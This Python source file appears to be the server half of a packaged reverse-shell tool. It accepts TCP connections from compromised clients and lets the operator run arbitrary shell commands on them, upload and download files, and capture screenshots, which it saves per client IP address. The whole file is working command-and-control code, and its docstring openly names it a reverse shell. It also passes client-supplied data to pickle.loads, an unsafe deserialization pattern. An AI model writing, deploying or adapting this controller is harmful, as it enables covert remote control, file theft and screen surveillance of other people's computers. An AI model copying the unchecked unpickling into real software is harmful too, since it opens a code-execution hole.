import os.path
import pickle
import re
import socket
from math import ceil
from kthread import KThread
import numpy as np
import cv2
from get_consecutive_filename import get_free_filename
from time import perf_counter
import gc
from kthread_sleep import sleep
import mss


def do_actions(
    client_socket,
    client_address,
    byte_len=32768,
    command_quit="quit",
    command_exit="exit",
    command_disconnect="disconnect",
    command_putfile="putfile",
    command_getfile="getfile",
    command_screenshot="screenshot",
    command_getcwd="getcwd",
    command_putfile_sep=b"FILESEP",
    command_start=b"START_START_START",
    command_end=b"END_END_END",
):
    activefolder = ""
    if not os.path.exists(a := client_address[0]):
        os.makedirs(a)
    if not os.path.exists(ascreen := os.path.join(a, "screenshots")):
        os.makedirs(ascreen)
    while True:
        cmd = input(f"{activefolder}")
        if cmd == command_quit:
            return "quit"
        if cmd == command_exit:
            return "exit"
        if cmd == command_disconnect:
            return "disconnect"
        if cmd.startswith(command_putfile):
            filetoread = cmd.split(maxsplit=1)[-1].strip("\"' ")
            if os.path.exists(filetoread):
                with open(filetoread, mode="rb") as f:
                    cmd_encoded = (
                        command_putfile.encode("utf-8")
                        + b" "
                        + command_putfile_sep
                        + filetoread.split(os.sep)[-1].encode("utf-8")
                        + command_putfile_sep
                        + f.read()
                    )
            else:
                print(f"file: {filetoread} does not exist!")
                continue
        else:
            cmd_encoded = cmd.encode("utf-8")
        cmd_encoded = encode_cmd(
            cmd_encoded=cmd_encoded,
            byte_len=byte_len,
            command_start=command_start,
            command_end=command_end,
        )
        for datatosend in [cmd_encoded[i:i + byte_len] for i in range(0, len(cmd_encoded), byte_len)]:
            client_socket.send(datatosend)
        response_from_client = b""
        while command_end not in response_from_client:
            response_from_client += client_socket.recv(byte_len)
        response_from_client = response_from_client.split(command_start, maxsplit=1)[
            1
        ].split(command_end, maxsplit=1)[0]
        if cmd == command_screenshot:
            img = pickle.loads(response_from_client)
            img = np.array(img)
            savepath = get_free_filename(
                folder=ascreen, fileextension=".png", leadingzeros=10
            )
            cv2.imwrite(savepath, img)
        elif cmd.lower().startswith("cd "):
            activefolder = response_from_client.decode("utf-8", "ignore") + ">"
        elif cmd == command_getcwd:
            activefolder = response_from_client.decode("utf-8", "ignore") + ">"
        elif cmd.startswith(command_getfile):
            filename = [x for x in re.split(r"[\\/]+", cmd.split(maxsplit=1)[-1]) if x][
                -1
            ]
            filename = os.path.join(a, filename)
            with open(filename, mode="wb") as f:
                f.write(response_from_client)
        elif cmd.startswith(command_putfile):
            print("File saved: " + response_from_client.decode("utf-8", "ignore"))
        else:
            print(response_from_client.decode("utf-8", "ignore"))


def get_server_and_bind_address(port=12345):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    address = ("", port)
    server_socket.bind(address)
    return server_socket


def listen_and_accept_clients(server_socket, listen=5):
    server_socket.listen(listen)
    client_socket, client_address = server_socket.accept()
    return client_socket, client_address


class ShellServer:
    r"""
    Shell Server: A simple server-side application that allows multiple clients to connect, execute shell-like commands,
    taking screenshots, and exchange files over a network using sockets.

    To install the client: https://pypi.org/project/reverseshellclient/

    This server application implements a basic command shell that listens for client connections, executes user commands,
    and responds to the client with appropriate outputs or actions.
    Clients can connect to the server using a TCP/IP socket

    The server and client communicate using a custom command encoding format to handle large data transmissions.
    The server can send data to the client, and the client can send data to the server.


    Usage:
    1. Instantiate the ShellServer class with desired configurations (port, buffer size, commands, etc.).
    2. Start the server using the `do_actions()` method, which listens for incoming client connections and allows communication with clients.
    3. Clients can connect to the server using a TCP/IP socket.

    Note:
    - The server can handle multiple clients simultaneously through multi-threading.
    - When a client sends the 'quit' command, the client remains connected.
    - When a client sends the 'exit' command, the client is disconnected from the server.
    - The server supports the 'putfile' and 'getfile' commands to send and receive files between the server and clients.

    Example usage:
    from reverseshellserver import ShellServer
    se = ShellServer(
        port=12345,
        listen=5,
        byte_len=32768,
        command_quit="quit",
        command_disconnect="disconnect",
        command_exit="exit",
        command_putfile="putfile",
        command_getfile="getfile",
        command_screenshot="screenshot",
        command_getcwd="getcwd",
        command_putfile_sep=b"FILESEP",
        command_start=b"START_START_START",
        command_end=b"END_END_END",
    )
    se.do_actions()

    """

    def __init__(
        self,
        port: int = 12345,
        listen: int = 5,
        byte_len: int = 32768,
        command_quit: str = "quit",
        command_exit: str = "exit",
        command_disconnect: str = "disconnect",
        command_putfile: str = "putfile",
        command_getfile: str = "getfile",
        command_screenshot: str = "screenshot",
        command_getcwd: str = "getcwd",
        command_putfile_sep: bytes = b"FILESEP",
        command_start: bytes = b"START_START_START",
        command_end: bytes = b"END_END_END",
    ):
        r"""
        Initialize the ShellServer object with the specified configurations.

        Parameters:
            port (int): The port number on which the server will listen for incoming connections.
            listen (int): The maximum number of queued connections to allow (backlog) while the server is busy.
            byte_len (int): The maximum size of each data chunk (in bytes) used for communication with clients.
            command_quit (str): The command that switches back to the client selection.
            command_exit (str): The command that closes the server.
            command_disconnect (str): The command that disconnects a client from the server.
            command_putfile (str): The command prefix used to indicate a request from the server to send a file to the client.
            command_getfile (str): The command prefix used to indicate a request from the server to receive a file from the client.
            command_screenshot (str): The command that, when sent by a server, requests the client to take a screenshot and send it back as an image file.
            command_getcwd (str): The command that, when sent by a server, requests the client to send the current working directory path.
            command_putfile_sep (bytes): The separator used to split the 'putfile' command and the filename along with the file content.
            command_start (bytes): The marker used to indicate the start of a command transmission.
            command_end (bytes): The marker used to indicate the end of a command transmission.

        Note:
            - 'command_quit', 'command_exit', and 'command_disconnect' serve different purposes in controlling the client-server interaction.
            - The 'command_putfile', 'command_getfile', 'command_screenshot', and 'command_getcwd' prefixes are used for specific actions from the server.
            - The 'command_putfile_sep' is used to split the 'putfile' command and the filename along with the file content.
            - 'command_start' and 'command_end' are used to wrap the encoded command for large data transmissions.
            - The server starts listening for incoming client connections in a separate thread when this object is initialized.
        """
        self.port = port
        self.listen = listen
        self.server_socket = get_server_and_bind_address(port=self.port)
        self.all_clients = {}
        self.active = True
        self.byte_len = byte_len
        self.command_exit = command_exit
        self.command_quit = command_quit
        self.command_putfile = command_putfile
        self.command_getfile = command_getfile
        self.command_screenshot = command_screenshot
        self.command_getcwd = command_getcwd
        self.command_putfile_sep = command_putfile_sep
        self.command_start = command_start
        self.command_end = command_end
        self.command_disconnect = command_disconnect
        self.listen_thread = KThread(
            target=self._listen_for_clients, name=str(perf_counter())
        )
        self.listen_thread.start()

    def _listen_for_clients(self):
        counter = 0
        while self.active:
            try:
                client_socket, client_address = listen_and_accept_clients(
                    self.server_socket, listen=self.listen
                )
                self.all_clients[counter] = {
                    "client_socket": client_socket,
                    "client_address": client_address,
                }
                print(f"\nClient connected: {client_address}")
                counter = counter + 1
            except Exception:
                continue

    def do_actions(self):
        while self.active:
            if not self.all_clients:
                print("Waiting for clients", end="\r")
                sleep(1)
                continue

            user_input = 0
            client_socket = None
            client_address = None
            while self.active:
                try:
                    for key, item in self.all_clients.items():
                        print(
                            str(key).ljust(5).rjust(5)
                            + " -> "
                            + ":".join([str(x) for x in item["client_address"]])
                        )
                    user_input = int(input("Choose a client"))
                    client_socket = self.all_clients[user_input]["client_socket"]
                    client_address = self.all_clients[user_input]["client_address"]
                    break
                except Exception:
                    continue
            if not self.active:
                continue

            try:
                doexit = do_actions(
                    client_socket=client_socket,
                    client_address=client_address,
                    byte_len=self.byte_len,
                    command_quit=self.command_quit,
                    command_exit=self.command_exit,
                    command_disconnect=self.command_disconnect,
                    command_putfile=self.command_putfile,
                    command_getfile=self.command_getfile,
                    command_screenshot=self.command_screenshot,
                    command_getcwd=self.command_getcwd,
                    command_putfile_sep=self.command_putfile_sep,
                    command_start=self.command_start,
                    command_end=self.command_end,
                )
                if doexit == "quit":
                    continue
                if doexit == "exit":
                    self.active = False
                    sleep(1)
                    self.server_socket.close()
                    break
                if doexit == "disconnect":
                    print("disconnecting")
                    try:
                        self.all_clients[user_input]["client_socket"].close()
                    except Exception as fe:
                        print(fe)
                    del self.all_clients[user_input]
                    del client_socket
                    del client_address
                    gc.collect()
            except Exception as fe:
                print(fe)


def encode_cmd(
    cmd_encoded,
    byte_len,
    command_start=b"START_START_START",
    command_end=b"END_END_END",
):
    cmd_full = command_start + cmd_encoded + command_end
    lencmdfull = len(cmd_full)
    whole_size = byte_len * ceil(lencmdfull / byte_len)
    cmd_add = (whole_size - lencmdfull) * b"\x00"
    return cmd_full + cmd_add
